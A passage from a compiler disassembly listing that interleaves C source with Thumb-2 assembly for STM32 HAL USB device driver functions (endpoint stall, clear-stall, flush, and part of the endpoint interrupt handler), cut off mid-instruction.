    return HAL_ERROR;
 80023fa:	2301      	movs	r3, #1
 80023fc:	e04c      	b.n	8002498 <HAL_PCD_EP_SetStall+0xb8>
  }

  if ((0x80U & ep_addr) == 0x80U)
 80023fe:	f997 3003 	ldrsb.w	r3, [r7, #3]
 8002402:	2b00      	cmp	r3, #0
 8002404:	da0e      	bge.n	8002424 <HAL_PCD_EP_SetStall+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 8002406:	78fb      	ldrb	r3, [r7, #3]
 8002408:	f003 0307 	and.w	r3, r3, #7
 800240c:	1c5a      	adds	r2, r3, #1
 800240e:	4613      	mov	r3, r2
 8002410:	009b      	lsls	r3, r3, #2
 8002412:	4413      	add	r3, r2
 8002414:	00db      	lsls	r3, r3, #3
 8002416:	687a      	ldr	r2, [r7, #4]
 8002418:	4413      	add	r3, r2
 800241a:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 800241c:	68fb      	ldr	r3, [r7, #12]
 800241e:	2201      	movs	r2, #1
 8002420:	705a      	strb	r2, [r3, #1]
 8002422:	e00c      	b.n	800243e <HAL_PCD_EP_SetStall+0x5e>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr];
 8002424:	78fa      	ldrb	r2, [r7, #3]
 8002426:	4613      	mov	r3, r2
 8002428:	009b      	lsls	r3, r3, #2
 800242a:	4413      	add	r3, r2
 800242c:	00db      	lsls	r3, r3, #3
 800242e:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002432:	687a      	ldr	r2, [r7, #4]
 8002434:	4413      	add	r3, r2
 8002436:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 8002438:	68fb      	ldr	r3, [r7, #12]
 800243a:	2200      	movs	r2, #0
 800243c:	705a      	strb	r2, [r3, #1]
  }

  ep->is_stall = 1U;
 800243e:	68fb      	ldr	r3, [r7, #12]
 8002440:	2201      	movs	r2, #1
 8002442:	709a      	strb	r2, [r3, #2]
  ep->num = ep_addr & EP_ADDR_MSK;
 8002444:	78fb      	ldrb	r3, [r7, #3]
 8002446:	f003 0307 	and.w	r3, r3, #7
 800244a:	b2da      	uxtb	r2, r3
 800244c:	68fb      	ldr	r3, [r7, #12]
 800244e:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 8002450:	687b      	ldr	r3, [r7, #4]
 8002452:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8002456:	2b01      	cmp	r3, #1
 8002458:	d101      	bne.n	800245e <HAL_PCD_EP_SetStall+0x7e>
 800245a:	2302      	movs	r3, #2
 800245c:	e01c      	b.n	8002498 <HAL_PCD_EP_SetStall+0xb8>
 800245e:	687b      	ldr	r3, [r7, #4]
 8002460:	2201      	movs	r2, #1
 8002462:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  (void)USB_EPSetStall(hpcd->Instance, ep);
 8002466:	687b      	ldr	r3, [r7, #4]
 8002468:	681b      	ldr	r3, [r3, #0]
 800246a:	68f9      	ldr	r1, [r7, #12]
 800246c:	4618      	mov	r0, r3
 800246e:	f005 febb 	bl	80081e8 <USB_EPSetStall>

  if ((ep_addr & EP_ADDR_MSK) == 0U)
 8002472:	78fb      	ldrb	r3, [r7, #3]
 8002474:	f003 0307 	and.w	r3, r3, #7
 8002478:	2b00      	cmp	r3, #0
 800247a:	d108      	bne.n	800248e <HAL_PCD_EP_SetStall+0xae>
  {
    (void)USB_EP0_OutStart(hpcd->Instance, (uint8_t *)hpcd->Setup);
 800247c:	687b      	ldr	r3, [r7, #4]
 800247e:	681a      	ldr	r2, [r3, #0]
 8002480:	687b      	ldr	r3, [r7, #4]
 8002482:	f503 732c 	add.w	r3, r3, #688	; 0x2b0
 8002486:	4619      	mov	r1, r3
 8002488:	4610      	mov	r0, r2
 800248a:	f005 fffc 	bl	8008486 <USB_EP0_OutStart>
  }

  __HAL_UNLOCK(hpcd);
 800248e:	687b      	ldr	r3, [r7, #4]
 8002490:	2200      	movs	r2, #0
 8002492:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 8002496:	2300      	movs	r3, #0
}
 8002498:	4618      	mov	r0, r3
 800249a:	3710      	adds	r7, #16
 800249c:	46bd      	mov	sp, r7
 800249e:	bd80      	pop	{r7, pc}

080024a0 <HAL_PCD_EP_ClrStall>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_ClrStall(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 80024a0:	b580      	push	{r7, lr}
 80024a2:	b084      	sub	sp, #16
 80024a4:	af00      	add	r7, sp, #0
 80024a6:	6078      	str	r0, [r7, #4]
 80024a8:	460b      	mov	r3, r1
 80024aa:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if (((uint32_t)ep_addr & 0x0FU) > hpcd->Init.dev_endpoints)
 80024ac:	78fb      	ldrb	r3, [r7, #3]
 80024ae:	f003 020f 	and.w	r2, r3, #15
 80024b2:	687b      	ldr	r3, [r7, #4]
 80024b4:	685b      	ldr	r3, [r3, #4]
 80024b6:	429a      	cmp	r2, r3
 80024b8:	d901      	bls.n	80024be <HAL_PCD_EP_ClrStall+0x1e>
  {
    return HAL_ERROR;
 80024ba:	2301      	movs	r3, #1
 80024bc:	e040      	b.n	8002540 <HAL_PCD_EP_ClrStall+0xa0>
  }

  if ((0x80U & ep_addr) == 0x80U)
 80024be:	f997 3003 	ldrsb.w	r3, [r7, #3]
 80024c2:	2b00      	cmp	r3, #0
 80024c4:	da0e      	bge.n	80024e4 <HAL_PCD_EP_ClrStall+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 80024c6:	78fb      	ldrb	r3, [r7, #3]
 80024c8:	f003 0307 	and.w	r3, r3, #7
 80024cc:	1c5a      	adds	r2, r3, #1
 80024ce:	4613      	mov	r3, r2
 80024d0:	009b      	lsls	r3, r3, #2
 80024d2:	4413      	add	r3, r2
 80024d4:	00db      	lsls	r3, r3, #3
 80024d6:	687a      	ldr	r2, [r7, #4]
 80024d8:	4413      	add	r3, r2
 80024da:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 80024dc:	68fb      	ldr	r3, [r7, #12]
 80024de:	2201      	movs	r2, #1
 80024e0:	705a      	strb	r2, [r3, #1]
 80024e2:	e00e      	b.n	8002502 <HAL_PCD_EP_ClrStall+0x62>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 80024e4:	78fb      	ldrb	r3, [r7, #3]
 80024e6:	f003 0207 	and.w	r2, r3, #7
 80024ea:	4613      	mov	r3, r2
 80024ec:	009b      	lsls	r3, r3, #2
 80024ee:	4413      	add	r3, r2
 80024f0:	00db      	lsls	r3, r3, #3
 80024f2:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80024f6:	687a      	ldr	r2, [r7, #4]
 80024f8:	4413      	add	r3, r2
 80024fa:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 80024fc:	68fb      	ldr	r3, [r7, #12]
 80024fe:	2200      	movs	r2, #0
 8002500:	705a      	strb	r2, [r3, #1]
  }

  ep->is_stall = 0U;
 8002502:	68fb      	ldr	r3, [r7, #12]
 8002504:	2200      	movs	r2, #0
 8002506:	709a      	strb	r2, [r3, #2]
  ep->num = ep_addr & EP_ADDR_MSK;
 8002508:	78fb      	ldrb	r3, [r7, #3]
 800250a:	f003 0307 	and.w	r3, r3, #7
 800250e:	b2da      	uxtb	r2, r3
 8002510:	68fb      	ldr	r3, [r7, #12]
 8002512:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 8002514:	687b      	ldr	r3, [r7, #4]
 8002516:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 800251a:	2b01      	cmp	r3, #1
 800251c:	d101      	bne.n	8002522 <HAL_PCD_EP_ClrStall+0x82>
 800251e:	2302      	movs	r3, #2
 8002520:	e00e      	b.n	8002540 <HAL_PCD_EP_ClrStall+0xa0>
 8002522:	687b      	ldr	r3, [r7, #4]
 8002524:	2201      	movs	r2, #1
 8002526:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_EPClearStall(hpcd->Instance, ep);
 800252a:	687b      	ldr	r3, [r7, #4]
 800252c:	681b      	ldr	r3, [r3, #0]
 800252e:	68f9      	ldr	r1, [r7, #12]
 8002530:	4618      	mov	r0, r3
 8002532:	f005 feaa 	bl	800828a <USB_EPClearStall>
  __HAL_UNLOCK(hpcd);
 8002536:	687b      	ldr	r3, [r7, #4]
 8002538:	2200      	movs	r2, #0
 800253a:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 800253e:	2300      	movs	r3, #0
}
 8002540:	4618      	mov	r0, r3
 8002542:	3710      	adds	r7, #16
 8002544:	46bd      	mov	sp, r7
 8002546:	bd80      	pop	{r7, pc}

08002548 <HAL_PCD_EP_Flush>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Flush(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 8002548:	b580      	push	{r7, lr}
 800254a:	b082      	sub	sp, #8
 800254c:	af00      	add	r7, sp, #0
 800254e:	6078      	str	r0, [r7, #4]
 8002550:	460b      	mov	r3, r1
 8002552:	70fb      	strb	r3, [r7, #3]
  __HAL_LOCK(hpcd);
 8002554:	687b      	ldr	r3, [r7, #4]
 8002556:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 800255a:	2b01      	cmp	r3, #1
 800255c:	d101      	bne.n	8002562 <HAL_PCD_EP_Flush+0x1a>
 800255e:	2302      	movs	r3, #2
 8002560:	e01b      	b.n	800259a <HAL_PCD_EP_Flush+0x52>
 8002562:	687b      	ldr	r3, [r7, #4]
 8002564:	2201      	movs	r2, #1
 8002566:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  if ((ep_addr & 0x80U) == 0x80U)
 800256a:	f997 3003 	ldrsb.w	r3, [r7, #3]
 800256e:	2b00      	cmp	r3, #0
 8002570:	da09      	bge.n	8002586 <HAL_PCD_EP_Flush+0x3e>
  {
    (void)USB_FlushTxFifo(hpcd->Instance, (uint32_t)ep_addr & EP_ADDR_MSK);
 8002572:	687b      	ldr	r3, [r7, #4]
 8002574:	681a      	ldr	r2, [r3, #0]
 8002576:	78fb      	ldrb	r3, [r7, #3]
 8002578:	f003 0307 	and.w	r3, r3, #7
 800257c:	4619      	mov	r1, r3
 800257e:	4610      	mov	r0, r2
 8002580:	f003 fcb8 	bl	8005ef4 <USB_FlushTxFifo>
 8002584:	e004      	b.n	8002590 <HAL_PCD_EP_Flush+0x48>
  }
  else
  {
    (void)USB_FlushRxFifo(hpcd->Instance);
 8002586:	687b      	ldr	r3, [r7, #4]
 8002588:	681b      	ldr	r3, [r3, #0]
 800258a:	4618      	mov	r0, r3
 800258c:	f003 fcbe 	bl	8005f0c <USB_FlushRxFifo>
  }

  __HAL_UNLOCK(hpcd);
 8002590:	687b      	ldr	r3, [r7, #4]
 8002592:	2200      	movs	r2, #0
 8002594:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 8002598:	2300      	movs	r3, #0
}
 800259a:	4618      	mov	r0, r3
 800259c:	3708      	adds	r7, #8
 800259e:	46bd      	mov	sp, r7
 80025a0:	bd80      	pop	{r7, pc}

080025a2 <PCD_EP_ISR_Handler>:
  * @brief  This function handles PCD Endpoint interrupt request.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
static HAL_StatusTypeDef PCD_EP_ISR_Handler(PCD_HandleTypeDef *hpcd)
{
 80025a2:	b580      	push	{r7, lr}
 80025a4:	b096      	sub	sp, #88	; 0x58
 80025a6:	af00      	add	r7, sp, #0
 80025a8:	6078      	str	r0, [r7, #4]
#if (USE_USB_DOUBLE_BUFFER != 1U)
  count = 0U;
#endif /* USE_USB_DOUBLE_BUFFER */

  /* stay in loop while pending interrupts */
  while ((hpcd->Instance->ISTR & USB_ISTR_CTR) != 0U)
 80025aa:	e3b1      	b.n	8002d10 <PCD_EP_ISR_Handler+0x76e>
  {
    wIstr = hpcd->Instance->ISTR;
 80025ac:	687b      	ldr	r3, [r7, #4]
 80025ae:	681b      	ldr	r3, [r3, #0]
 80025b0:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 80025b4:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e

    /* extract highest priority endpoint number */
    epindex = (uint8_t)(wIstr & USB_ISTR_EP_ID);
 80025b8:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 80025bc:	b2db      	uxtb	r3, r3
 80025be:	f003 030f 	and.w	r3, r3, #15
 80025c2:	f887 304d 	strb.w	r3, [r7, #77]	; 0x4d

    if (epindex == 0U)
 80025c6:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 80025ca:	2b00      	cmp	r3, #0
 80025cc:	f040 8173 	bne.w	80028b6 <PCD_EP_ISR_Handler+0x314>
    {
      /* Decode and service control endpoint interrupt */

      /* DIR bit = origin of the interrupt */
      if ((wIstr & USB_ISTR_DIR) == 0U)
 80025d0:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 80025d4:	f003 0310 	and.w	r3, r3, #16
 80025d8:	2b00      	cmp	r3, #0
 80025da:	d150      	bne.n	800267e <PCD_EP_ISR_Handler+0xdc>
      {
        /* DIR = 0 */

        /* DIR = 0 => IN  int */
        /* DIR = 0 implies that (EP_CTR_TX = 1) always */
        PCD_CLEAR_TX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 80025dc:	687b      	ldr	r3, [r7, #4]
 80025de:	681b      	ldr	r3, [r3, #0]
 80025e0:	881b      	ldrh	r3, [r3, #0]
 80025e2:	b29b      	uxth	r3, r3
 80025e4:	f423 43e1 	bic.w	r3, r3, #28800	; 0x7080
 80025e8:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80025ec:	81fb      	strh	r3, [r7, #14]
 80025ee:	687b      	ldr	r3, [r7, #4]
 80025f0:	681a      	ldr	r2, [r3, #0]
 80025f2:	89fb      	ldrh	r3, [r7, #14]
 80025f4:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80025f8:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80025fc:	b29b      	uxth	r3, r3
 80025fe:	8013      	strh	r3, [r2, #0]
        ep = &hpcd->IN_ep[0];
 8002600:	687b      	ldr	r3, [r7, #4]
 8002602:	3328      	adds	r3, #40	; 0x28
 8002604:	657b      	str	r3, [r7, #84]	; 0x54

        ep->xfer_count = PCD_GET_EP_TX_CNT(hpcd->Instance, ep->num);
 8002606:	687b      	ldr	r3, [r7, #4]
 8002608:	681b      	ldr	r3, [r3, #0]
 800260a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800260e:	b29b      	uxth	r3, r3
 8002610:	461a      	mov	r2, r3
 8002612:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002614:	781b      	ldrb	r3, [r3, #0]
 8002616:	00db      	lsls	r3, r3, #3
 8002618:	4413      	add	r3, r2
 800261a:	687a      	ldr	r2, [r7, #4]
 800261c:	6812      	ldr	r2, [r2, #0]
 800261e:	4413      	add	r3, r2
 8002620:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002624:	881b      	ldrh	r3, [r3, #0]
 8002626:	f3c3 0209 	ubfx	r2, r3, #0, #10
 800262a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800262c:	61da      	str	r2, [r3, #28]
        ep->xfer_buff += ep->xfer_count;
 800262e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002630:	695a      	ldr	r2, [r3, #20]
 8002632:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002634:	69db      	ldr	r3, [r3, #28]
 8002636:	441a      	add	r2, r3
 8002638:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800263a:	615a      	str	r2, [r3, #20]

        /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
        hpcd->DataInStageCallback(hpcd, 0U);
#else
        HAL_PCD_DataInStageCallback(hpcd, 0U);
 800263c:	2100      	movs	r1, #0
 800263e:	6878      	ldr	r0, [r7, #4]
 8002640:	f00a f98f 	bl	800c962 <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

        if ((hpcd->USB_Address > 0U) && (ep->xfer_len == 0U))
 8002644:	687b      	ldr	r3, [r7, #4]
 8002646:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 800264a:	b2db      	uxtb	r3, r3
 800264c:	2b00      	cmp	r3, #0
 800264e:	f000 835f 	beq.w	8002d10 <PCD_EP_ISR_Handler+0x76e>
 8002652:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002654:	699b      	ldr	r3, [r3, #24]
 8002656:	2b00      	cmp	r3, #0
 8002658:	f040 835a 	bne.w	8002d10 <PCD_EP_ISR_Handler+0x76e>
        {
          hpcd->Instance->DADDR = ((uint16_t)hpcd->USB_Address | USB_DADDR_EF);
 800265c:	687b      	ldr	r3, [r7, #4]
 800265e:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 8002662:	b2db      	uxtb	r3, r3
 8002664:	f063 037f 	orn	r3, r3, #127	; 0x7f
 8002668:	b2da      	uxtb	r2, r3
 800266a:	687b      	ldr	r3, [r7, #4]
 800266c:	681b      	ldr	r3, [r3, #0]
 800266e:	b292      	uxth	r2, r2
 8002670:	f8a3 204c 	strh.w	r2, [r3, #76]	; 0x4c
          hpcd->USB_Address = 0U;
 8002674:	687b      	ldr	r3, [r7, #4]
 8002676:	2200      	movs	r2, #0
 8002678:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 800267c:	e348      	b.n	8002d10 <PCD_EP_ISR_Handler+0x76e>
      {
        /* DIR = 1 */

        /* DIR = 1 & CTR_RX => SETUP or OUT int */
        /* DIR = 1 & (CTR_TX | CTR_RX) => 2 int pending */
        ep = &hpcd->OUT_ep[0];
 800267e:	687b      	ldr	r3, [r7, #4]
 8002680:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002684:	657b      	str	r3, [r7, #84]	; 0x54
        wEPVal = PCD_GET_ENDPOINT(hpcd->Instance, PCD_ENDP0);
 8002686:	687b      	ldr	r3, [r7, #4]
 8002688:	681b      	ldr	r3, [r3, #0]
 800268a:	881b      	ldrh	r3, [r3, #0]
 800268c:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

        if ((wEPVal & USB_EP_SETUP) != 0U)
 8002690:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002694:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8002698:	2b00      	cmp	r3, #0
 800269a:	d032      	beq.n	8002702 <PCD_EP_ISR_Handler+0x160>
        {
          /* Get SETUP Packet */
          ep->xfer_count = PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 800269c:	687b      	ldr	r3, [r7, #4]
 800269e:	681b      	ldr	r3, [r3, #0]
 80026a0:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80026a4:	b29b      	uxth	r3, r3
 80026a6:	461a      	mov	r2, r3
 80026a8:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026aa:	781b      	ldrb	r3, [r3, #0]
 80026ac:	00db      	lsls	r3, r3, #3
 80026ae:	4413      	add	r3, r2
 80026b0:	687a      	ldr	r2, [r7, #4]
 80026b2:	6812      	ldr	r2, [r2, #0]
 80026b4:	4413      	add	r3, r2
 80026b6:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80026ba:	881b      	ldrh	r3, [r3, #0]
 80026bc:	f3c3 0209 	ubfx	r2, r3, #0, #10
 80026c0:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026c2:	61da      	str	r2, [r3, #28]

          USB_ReadPMA(hpcd->Instance, (uint8_t *)hpcd->Setup,
 80026c4:	687b      	ldr	r3, [r7, #4]
 80026c6:	6818      	ldr	r0, [r3, #0]
 80026c8:	687b      	ldr	r3, [r7, #4]
 80026ca:	f503 712c 	add.w	r1, r3, #688	; 0x2b0
 80026ce:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026d0:	88da      	ldrh	r2, [r3, #6]
                      ep->pmaadress, (uint16_t)ep->xfer_count);
 80026d2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026d4:	69db      	ldr	r3, [r3, #28]
          USB_ReadPMA(hpcd->Instance, (uint8_t *)hpcd->Setup,
 80026d6:	b29b      	uxth	r3, r3
 80026d8:	f005 ff23 	bl	8008522 <USB_ReadPMA>

          /* SETUP bit kept frozen while CTR_RX = 1 */
          PCD_CLEAR_RX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 80026dc:	687b      	ldr	r3, [r7, #4]
 80026de:	681b      	ldr	r3, [r3, #0]
 80026e0:	881b      	ldrh	r3, [r3, #0]
 80026e2:	b29a      	uxth	r2, r3
 80026e4:	f640 738f 	movw	r3, #3983	; 0xf8f
 80026e8:	4013      	ands	r3, r2
 80026ea:	823b      	strh	r3, [r7, #16]
 80026ec:	687b      	ldr	r3, [r7, #4]
 80026ee:	681b      	ldr	r3, [r3, #0]
 80026f0:	8a3a      	ldrh	r2, [r7, #16]
 80026f2:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 80026f6:	b292      	uxth	r2, r2
 80026f8:	801a      	strh	r2, [r3, #0]

          /* Process SETUP Packet*/
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->SetupStageCallback(hpcd);
#else
          HAL_PCD_SetupStageCallback(hpcd);
 80026fa:	6878      	ldr	r0, [r7, #4]
 80026fc:	f00a f904 	bl	800c908 <HAL_PCD_SetupStageCallback>
 8002700:	e306      	b.n	8002d10 <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else if ((wEPVal & USB_EP_CTR_RX) != 0U)
 8002702:	f9b7 304a 	ldrsh.w	r3, [r7, #74]	; 0x4a
 8002706:	2b00      	cmp	r3, #0
 8002708:	f280 8302 	bge.w	8002d10 <PCD_EP_ISR_Handler+0x76e>
        {
          PCD_CLEAR_RX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 800270c:	687b      	ldr	r3, [r7, #4]
 800270e:	681b      	ldr	r3, [r3, #0]
 8002710:	881b      	ldrh	r3, [r3, #0]
 8002712:	b29a      	uxth	r2, r3
 8002714:	f640 738f 	movw	r3, #3983	; 0xf8f
 8002718:	4013      	ands	r3, r2
 800271a:	83fb      	strh	r3, [r7, #30]
 800271c:	687b      	ldr	r3, [r7, #4]
 800271e:	681b      	ldr	r3, [r3, #0]
 8002720:	8bfa      	ldrh	r2, [r7, #30]
 8002722:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 8002726:	b292      	uxth	r2, r2
 8002728:	801a      	strh	r2, [r3, #0]

          /* Get Control Data OUT Packet */
          ep->xfer_count = PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 800272a:	687b      	ldr	r3, [r7, #4]
 800272c:	681b      	ldr	r3, [r3, #0]
 800272e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002732:	b29b      	uxth	r3, r3
 8002734:	461a      	mov	r2, r3
 8002736:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002738:	781b      	ldrb	r3, [r3, #0]
 800273a:	00db      	lsls	r3, r3, #3
 800273c:	4413      	add	r3, r2
 800273e:	687a      	ldr	r2, [r7, #4]
 8002740:	6812      	ldr	r2, [r2, #0]
 8002742:	4413      	add	r3, r2
 8002744:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002748:	881b      	ldrh	r3, [r3, #0]
 800274a:	f3c3 0209 	ubfx	r2, r3, #0, #10
 800274e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002750:	61da      	str	r2, [r3, #28]

          if ((ep->xfer_count != 0U) && (ep->xfer_buff != 0U))
 8002752:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002754:	69db      	ldr	r3, [r3, #28]
 8002756:	2b00      	cmp	r3, #0
 8002758:	d019      	beq.n	800278e <PCD_EP_ISR_Handler+0x1ec>
 800275a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800275c:	695b      	ldr	r3, [r3, #20]
 800275e:	2b00      	cmp	r3, #0
 8002760:	d015      	beq.n	800278e <PCD_EP_ISR_Handler+0x1ec>
          {
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff,
 8002762:	687b      	ldr	r3, [r7, #4]
 8002764:	6818      	ldr	r0, [r3, #0]
 8002766:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002768:	6959      	ldr	r1, [r3, #20]
 800276a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800276c:	88da      	ldrh	r2, [r3, #6]
                        ep->pmaadress, (uint16_t)ep->xfer_count);
 800276e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002770:	69db      	ldr	r3, [r3, #28]
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff,
 8002772:	b29b      	uxth	r3, r3
 8002774:	f005 fed5 	bl	8008522 <USB_ReadPMA>

            ep->xfer_buff += ep->xfer_count;
 8002778:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800277a:	695a      	ldr	r2, [r3, #20]
 800277c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800277e:	69db      	ldr	r3, [r3, #28]
 8002780:	441a      	add	r2, r3
 8002782:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002784:	615a      	str	r2, [r3, #20]

            /* Process Control Data OUT Packet */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
            hpcd->DataOutStageCallback(hpcd, 0U);
#else
            HAL_PCD_DataOutStageCallback(hpcd, 0U);
 8002786:	2100      	movs	r1, #0
 8002788:	6878      	ldr	r0, [r7, #4]
 800278a:	f00a f8cf 	bl	800c92c <HAL_PCD_DataOutStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
          }

          wEPVal = (uint16_t)PCD_GET_ENDPOINT(hpcd->Instance, PCD_ENDP0);
 800278e:	687b      	ldr	r3, [r7, #4]
 8002790:	681b      	ldr	r3, [r3, #0]
 8002792:	881b      	ldrh	r3, [r3, #0]
 8002794:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

          if (((wEPVal & USB_EP_SETUP) == 0U) && ((wEPVal & USB_EP_RX_STRX) != USB_EP_RX_VALID))
 8002798:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 800279c:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 80027a0:	2b00      	cmp	r3, #0
 80027a2:	f040 82b5 	bne.w	8002d10 <PCD_EP_ISR_Handler+0x76e>
 80027a6:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 80027aa:	f403 5340 	and.w	r3, r3, #12288	; 0x3000
 80027ae:	f5b3 5f40 	cmp.w	r3, #12288	; 0x3000
 80027b2:	f000 82ad 	beq.w	8002d10 <PCD_EP_ISR_Handler+0x76e>
          {
            PCD_SET_EP_RX_CNT(hpcd->Instance, PCD_ENDP0, ep->maxpacket);
 80027b6:	687b      	ldr	r3, [r7, #4]
 80027b8:	681b      	ldr	r3, [r3, #0]
 80027ba:	61bb      	str	r3, [r7, #24]
 80027bc:	687b      	ldr	r3, [r7, #4]
 80027be:	681b      	ldr	r3, [r3, #0]
 80027c0:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80027c4:	b29b      	uxth	r3, r3
 80027c6:	461a      	mov	r2, r3
 80027c8:	69bb      	ldr	r3, [r7, #24]
 80027ca:	4413      	add	r3, r2
 80027cc:	61bb      	str	r3, [r7, #24]
 80027ce:	69bb      	ldr	r3, [r7, #24]
 80027d0:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80027d4:	617b      	str	r3, [r7, #20]
 80027d6:	697b      	ldr	r3, [r7, #20]
 80027d8:	881b      	ldrh	r3, [r3, #0]
 80027da:	b29b      	uxth	r3, r3
 80027dc:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80027e0:	b29a      	uxth	r2, r3
 80027e2:	697b      	ldr	r3, [r7, #20]
 80027e4:	801a      	strh	r2, [r3, #0]
 80027e6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80027e8:	691b      	ldr	r3, [r3, #16]
 80027ea:	2b3e      	cmp	r3, #62	; 0x3e
 80027ec:	d91d      	bls.n	800282a <PCD_EP_ISR_Handler+0x288>
 80027ee:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80027f0:	691b      	ldr	r3, [r3, #16]
 80027f2:	095b      	lsrs	r3, r3, #5
 80027f4:	647b      	str	r3, [r7, #68]	; 0x44
 80027f6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80027f8:	691b      	ldr	r3, [r3, #16]
 80027fa:	f003 031f 	and.w	r3, r3, #31
 80027fe:	2b00      	cmp	r3, #0
 8002800:	d102      	bne.n	8002808 <PCD_EP_ISR_Handler+0x266>
 8002802:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8002804:	3b01      	subs	r3, #1
 8002806:	647b      	str	r3, [r7, #68]	; 0x44
 8002808:	697b      	ldr	r3, [r7, #20]
 800280a:	881b      	ldrh	r3, [r3, #0]
 800280c:	b29a      	uxth	r2, r3
 800280e:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8002810:	b29b      	uxth	r3, r3
 8002812:	029b      	lsls	r3, r3, #10
